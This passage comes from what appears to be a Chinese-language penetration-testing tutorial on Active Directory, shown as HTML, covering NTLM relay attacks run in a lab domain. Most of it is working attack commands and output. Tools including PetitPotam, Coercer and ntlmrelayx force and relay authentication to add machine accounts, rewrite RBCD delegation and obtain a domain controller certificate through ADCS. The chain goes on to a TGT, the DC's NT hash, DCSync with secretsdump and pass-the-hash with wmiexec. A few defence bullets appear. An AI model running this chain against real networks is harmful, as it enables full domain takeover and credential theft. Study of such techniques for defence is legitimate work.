+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --escalate-user spiderman
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 privexchange.py -u spiderman -p 123.com -d hack.lab -ah 20.20.20.100 20.20.20.7</span></span></code></pre></div><p>####### 防御措施</p>
+<ul>
+<li>删除Exchange上的高权限用户</li>
+<li>启用 LDAP 签名，开启 LDAP 通道绑定</li>
+<li>打微软补丁</li>
+</ul>
+<h6 id="集成工具推荐---coercer" class="heading-element"><span>0.0.0.2.6  集成工具推荐 - Coercer</span>
+  <a href="#%e9%9b%86%e6%88%90%e5%b7%a5%e5%85%b7%e6%8e%a8%e8%8d%90---coercer" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>Coercer 是一款集成多种方法对目标服务器进行强制验证的python脚本</p>
+<p>工具地址 - <a href="https://github.com/p0dalirius/Coercer"target="_blank" rel="external nofollow noopener noreferrer">Coercer</a></p>
+<p>####### 工具安装</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/p0dalirius/Coercer
+</span></span><span style="display:flex;"><span>python3 -m pip install coercer</span></span></code></pre></div><p>####### 工具使用</p>
+<p>分析目标服务器可利用的接口，使用 &ndash;analyze 参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6 --analyze</span></span></code></pre></div><p>PS：加 -v 可以显示更加详细的信息</p>
+<p>执行强制验证攻击，默认先使用了 MS-EFSR::EfsRpcOpenFileRaw 方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6</span></span></code></pre></div><h6 id="总结" class="heading-element"><span>0.0.0.2.7  总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>本文介绍了5种强制验证的思路，下面将其进行对比汇总成一个表格</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Coerce</th>
+<th style="text-align:left">SMB named pipe</th>
+<th style="text-align:left">Protocol</th>
+<th style="text-align:left">API / Methods</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PrinterBug</td>
+<td style="text-align:left">\PIPE\spoolss</td>
+<td style="text-align:left">MS-RPRN</td>
+<td style="text-align:left">RpcRemoteFindFirstPrinterChangeNotificationEx</td>
+</tr>
+<tr>
+<td style="text-align:left">PeitiPotam</td>
+<td style="text-align:left">\PIPE\lsarpc</td>
+<td style="text-align:left">MS-EFSR</td>
+<td style="text-align:left">EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents EfsRpcFileKeyInfo</td>
+</tr>
+<tr>
+<td style="text-align:left">DFSCoerce</td>
+<td style="text-align:left">\pipe\netdfs</td>
+<td style="text-align:left">MS-DFSNM</td>
+<td style="text-align:left">NetrDfsRemoveStdRoot NetrDfsAddStdRoot</td>
+</tr>
+<tr>
+<td style="text-align:left">ShadowCoerce</td>
+<td style="text-align:left">\pipe\FssagentRpc</td>
+<td style="text-align:left">MS-FSRVP</td>
+<td style="text-align:left">IsPathSupported IsPathSupported</td>
+</tr>
+<tr>
+<td style="text-align:left">PrivExchange</td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left">PushSubscription</td>
+</tr>
+</tbody>
+</table>
+<h5 id="中继后攻击" class="heading-element"><span>0.0.0.3  中继后攻击</span>
+  <a href="#%e4%b8%ad%e7%bb%a7%e5%90%8e%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>攻击的思路可以从域内目标资源对象来展开，分为</p>
+<p>针对 ADCS 的攻击</p>
+<p>针对 域内主机资源的 RBCD 攻击</p>
+<p>针对 当前计算机的攻击</p>
+<p>针对 影子账户的攻击</p>
+</blockquote>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052302829.webp" alt="image-20240605230213662" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052302829.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052302829.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052302829.webp?size=large 2x" data-title="image-20240605230213662" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="添加机器账户" class="heading-element"><span>0.0.0.3.1  添加机器账户</span>
+  <a href="#%e6%b7%bb%e5%8a%a0%e6%9c%ba%e5%99%a8%e8%b4%a6%e6%88%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>&ndash;add-computer</p>
+</blockquote>
+<p>####### 攻击条件</p>
+<ul>
+<li>强制认证的目标需要有高权限，可以创建用户</li>
+<li>目标的 ms-DS-MachineAccountQuota 属性不为0</li>
+<li>目标具有 SeMachineAccountPrivilege 特权</li>
+</ul>
+<p>####### 攻击流程</p>
+<ol>
+<li>
+<p>启动监听器
+利用 ntlmrelay 工具中的参数 &ndash;add-computer</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest$ --remove-mic</span></span></code></pre></div><p>修改数据包中的值，需要切换协议，因此需要绕过mic验证，使用到参数 &ndash;remove-mic
+JustTest$ 为新增的机器账户名</p>
+</li>
+<li>
+<p>触发认证
+可以通过诱导、欺骗和强制验证等手段触发目标NTLM验证，这里使用 PetitPotam 进行强制认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6</span></span></code></pre></div></li>
+</ol>
+<p>查看 mS-DS-CreatorSID 属性，再通过 SID 反查可以看到是辅域控机器账户添加的（20.20.20.6）</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>AdFind.exe -h 20.20.20.5 -u spiderman -up 123.com -b <span style="color:#a6be9d">&#34;DC=hack,DC=lab&#34;</span> -f <span style="color:#a6be9d">&#34;objectClass=computer&#34;</span> mS-DS-CreatorSID</span></span></code></pre></div><p>$objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-2102;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052258662.webp" alt="image-20240605225845913" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052258662.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052258662.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406052258662.webp?size=large 2x" data-title="image-20240605225845913" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="修改目标服务器-rbcd-属性" class="heading-element"><span>0.0.0.3.2  修改目标服务器 RBCD 属性</span>
+  <a href="#%e4%bf%ae%e6%94%b9%e7%9b%ae%e6%a0%87%e6%9c%8d%e5%8a%a1%e5%99%a8-rbcd-%e5%b1%9e%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>&ndash;delegate-access</p>
+<p>&ndash;escalate-user</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>强制 NTLM 验证后对目标服务器 RBCD 属性进行修改，指向一个新的机器账户（或已存在的）。之后的流程就和 RBCD 攻击一致，利用该机器账户进行后渗透（DCSync）</p>
+<p>条件：</p>
+<ul>
+<li>域控支持 LDAPS 协议</li>
+<li>能创建机器账户或已有可控的机器账户</li>
+</ul>
+<p>####### 攻击流程</p>
+<blockquote>
+<p>环境简介
+域名 - hack.lab
+域控 - DC01 - 20.20.20.5
+辅域 - F2016 - 20.20.20.6
+域主机 - USER01 - 20.20.20.10
+Kali - 20.20.20.100</p>
+</blockquote>
+<p>创建机器账户</p>
+<p><a href="https://github.com/CravateRouge/bloodyAD"target="_blank" rel="external nofollow noopener noreferrer">bloodyAD</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 bloodyAD.py -d hack.lab -u spiderman -p <span style="color:#a6be9d">&#39;123.com&#39;</span> --host 20.20.20.5 addComputer CPT001 <span style="color:#a6be9d">&#39;123.com&#39;</span></span></span></code></pre></div><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py"target="_blank" rel="external nofollow noopener noreferrer">addcomputer.py</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 addcomputer.py hack.lab/spiderman:123.com -method LDAPS -computer-name CPT001<span style="color:#a6be9d">\$</span> -computer-pass 123.com -dc-ip DC01.hack.lab</span></span></code></pre></div><p>1.开启监听</p>
+<p>使用 ntlmrelay 进行监听</p>
+<pre tabindex="0"><code>python3 ntlmrelayx.py -t ldap://DC01.hack.lab -smb2support --remove-mic --delegate-access --escalate-user CPT001$
+由于需要跨协议中继，需要绕过 mic 验证 ，结合 CVE-2019-1040 漏洞执行  
+如果不使用 --remove-mic 参数，会出现以下报错：</code></pre><p>2.使用PetitPotam触发目标 NTLM 验证</p>
+<pre tabindex="0"><code>python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.10</code></pre><p>此外，ntlmrelay工具集成了前两步的功能，直接创建机器账户并修改中继修改目标的 RBCD 属性</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://DC01.hack.lab -smb2support --delegate-access --remove-mic</span></span></code></pre></div><p>验证及使用</p>
+<p>可以在域控上查看目标服务器（20.20.20.10）的RBCD属性</p>
+<pre tabindex="0"><code>Get-ADComputer USER01 -Properties PrincipalsAllowedToDelegateToAccount</code></pre><p>后续的使用就是通过 getST.py 脚本申请服务票据和使用</p>
+<pre tabindex="0"><code>python3 getST.py -spn cifs/USER01.hack.lab -impersonate administrator hack.lab/CPT001\$:123.com -dc-ip 20.20.20.5</code></pre><h6 id="转储ad-cs注册服务和证书模板信息" class="heading-element"><span>0.0.0.3.3  转储AD CS注册服务和证书模板信息</span>
+  <a href="#%e8%bd%ac%e5%82%a8ad-cs%e6%b3%a8%e5%86%8c%e6%9c%8d%e5%8a%a1%e5%92%8c%e8%af%81%e4%b9%a6%e6%a8%a1%e6%9d%bf%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>&ndash;dump-adcs</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>通过 LDAP 获得域的 ADCS 配置（注册服务和证书模板，以及它们的访问权限），以便能够在没有域账户的情况下知道 ADCS 中继的目标服务器和模板。</p>
+<p>网络证书注册服务在其默认配置中容易受到 NTLM Relay 的影响，允许攻击者请求认证他们中继的用户或机器的证书并接管他们的账户</p>
+<p>####### 攻击流程</p>
+<p>1.找到网络注册服务的地址
+检查DCs上是否安装了 AD CS 网络注册服务</p>
+<pre tabindex="0"><code>curl xx.xx.xx.xx/certsrv/ -I</code></pre><p>检查由域的TLS服务提供的TLS证书中的信息</p>
+<p>查看本地机器账户的证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Get-ChildItem</span> <span style="color:#58a1dd">Cert</span>:\<span style="color:#58a1dd">LocalMachine</span>\<span style="color:#58a1dd">Root</span>\</span></span></code></pre></div><p>确定了AD CS的ip为 20.20.20.6</p>
+<p>2.设置监听器
+使用 ntlmrelay 作为中继监听器
+参数 &ndash;dump-adcs 用于转储AD CS注册服务和证书模板信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -debug -t ldap://20.20.20.5 --dump-adcs --remove-mic</span></span></code></pre></div><p>3.强制NTLM认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6</span></span></code></pre></div><p>4.获得域内信息</p>
+<p>在 F2016.hack.lab 主机上存在一个注册服务，任何经过认证的用户都可以在上面申请证书。可以获取到允许使用模板的用户有哪些</p>
+<pre tabindex="0"><code>certipy cert -pfx xx.pfx -nokey -out xxx.crt
+certipy cert -pfx xx.pfx -nocert -out xxx.crt</code></pre><p>其次还通过LDAP对域内进行信息收集，并在本地保存了关键信息</p>
+<h6 id="获取ad-cs证书" class="heading-element"><span>0.0.0.3.4  获取AD CS证书</span>
+  <a href="#%e8%8e%b7%e5%8f%96ad-cs%e8%af%81%e4%b9%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 攻击原理</p>
+<p>在域内配置了AD CS的情况下，可以通过NTLM Relay攻击获取到的证书进行申请 TGT 操作。</p>
+<blockquote>
+<p>关于证书攻击的部分可以查看之前的一些文章</p>
+</blockquote>
+<p>前置条件：</p>
+<ol>
+<li>AD CS被配置为允许NTLM认证</li>
+<li>NTLM认证没有受到EPA或SMB签名的保护</li>
+<li>AD CS正在运行这些服务中的任何一个：
+<ul>
+<li>证书颁发机构web注册</li>
+<li>证书注册web服务</li>
+</ul>
+</li>
+</ol>
+<p>####### 攻击流程</p>
+<ol>
+<li>使用 PetitPotam 针对域控强制验证</li>
+<li>监听获取域控的认证信息，伪造域控身份</li>
+<li>中继域控认证至AD CS上</li>
+<li>AD CS 返回域控对应的证书</li>
+<li>使用该证书向域控申请 TGT</li>
+</ol>
+<p>######## 攻击目标支持 PKINIT 协议</p>
+<p>在下面的实验中，攻击目标为域控 DC01$。如果域控支持 PKINIT 协议，在获取到域控的证书后，可以基于 PKINIT 协议申请 TGT。</p>
+<ol>
+<li>
+<p>设置监听器
+使用ntlmrelay工具进行监听</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -debug -smb2support --target http://20.20.20.6/certsrv/certfnsh.asp --adcs --template DomainController</span></span></code></pre></div></li>
+<li>
+<p>强制认证
+简单演示，使用 PetitPotam 工具进行强制认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.5</span></span></code></pre></div></li>
+<li>
+<p>证书处理
+执行上述两条命令后，可以看到获取到一串 Base64 证书信息，将其保存至 DC01_base64.txt 文件中</p>
+<p>将其解密为 .pfx 文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat DC01_base64.txt | base64 -d &gt; dc01.pfx</span></span></code></pre></div></li>
+</ol>
+<p>通过gettgtpkinit.py使用证书申请TGT</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 gettgtpkinit.py -cert-pfx dc01.pfx hack.lab/DC01$ dc01.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022-10-04 12:15:43,821 minikerberos INFO     b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50
+</span></span><span style="display:flex;"><span>INFO:minikerberos:b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50
+</span></span><span style="display:flex;"><span>2022-10-04 12:15:43,823 minikerberos INFO     Saved TGT to file
+</span></span><span style="display:flex;"><span>INFO:minikerberos:Saved TGT to file</span></span></code></pre></div><p>获取到域控TGT的后渗透攻击思路</p>
+<p>思路1 - 获取域控Hash</p>
+<pre tabindex="0"><code>KRB5CCNAME=dc01.ccache python3 getnthash.py -key b12ef2da16bdd741749a2ec30e67f0507ba38d7bb72f1c11034bc7160be98e50 hack.lab/DC01$</code></pre><p>思路2 - 执行DCSync攻击并横向</p>
+<pre tabindex="0"><code>KRB5CCNAME=dc01.ccache python3 secretsdump.py -k hack.lab/DC01\$@DC01.hack.lab -no-pass -just-dc-user administrator
+
+python3 wmiexec.py -hashes :42e2656ec24331269f82160ff5962387 hack.lab/administrator@DC01.hack.lab -dc-ip 20.20.20.5</code></pre><blockquote>
+<p>PS：如果出现如下报错信息
+[-] ERROR_DS_NAME_ERROR_NOT_UNIQUE: Name translation: Input name mapped to more than one output name.
+就使用 -just-dc-user administrator 参数指定对象</p>
+</blockquote>
+<p>######## 攻击目标不支持 PKINIT 协议</p>
+<p>这种情况下申请 TGT 票据会出现以下错误：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>KDC_ERR_PADATA_TYPE_NOSUPP Detail: <span style="color:#a6be9d">&#34;KDC has no support for PADATA type (pre-authentication data)&#34;</span> </span></span></code></pre></div><p>因此只能曲线就过了 —— 需要结合PTC攻击新思路，使用 PassTheCert 工具对LDAP服务器进行认证并进一步执行其他攻击思路。</p>
+<p>工具地址 - <a href="https://github.com/AlmondOffSec/PassTheCert"target="_blank" rel="external nofollow noopener noreferrer">PassTheCert</a></p>
+<p>域内环境：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>域控 - 20.20.20.5
+</span></span><span style="display:flex;"><span>辅域控（AD CS） - 20.20.20.6
+</span></span><span style="display:flex;"><span>域内主机 - 20.20.20.10
+</span></span><span style="display:flex;"><span>Kali - 20.20.20.100</span></span></code></pre></div><ol>
+<li>
+<p>使用 Certipy 工具获取 pfx 文件中的密钥和证书信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy cert -pfx NoPKI02.pfx -nokey -out NoPKI02.crt
+</span></span><span style="display:flex;"><span>certipy cert -pfx NoPKI02.pfx -nocert -out NoPKI02.key </span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0484943bc742b4af5f7e3957b8b241aa173861c4.png" alt="x3TcZt.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0484943bc742b4af5f7e3957b8b241aa173861c4.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0484943bc742b4af5f7e3957b8b241aa173861c4.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/10/attach-0484943bc742b4af5f7e3957b8b241aa173861c4.png?size=large 2x" data-title="x3TcZt.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</li>
+<li>
+<p>使用 passthecert.py 创建机器账户</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com</span></span></code></pre></div></li>
+</ol>
+<p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e6390bd0f9d8f3370c339c4eb0e7a11ef4254137.png" alt="x3T2If.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e6390bd0f9d8f3370c339c4eb0e7a11ef4254137.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e6390bd0f9d8f3370c339c4eb0e7a11ef4254137.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/10/attach-e6390bd0f9d8f3370c339c4eb0e7a11ef4254137.png?size=large 2x" data-title="x3T2If.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<ol>
+<li>
+<p>使用 passthecert.py 添加 RBCD 属性</p>
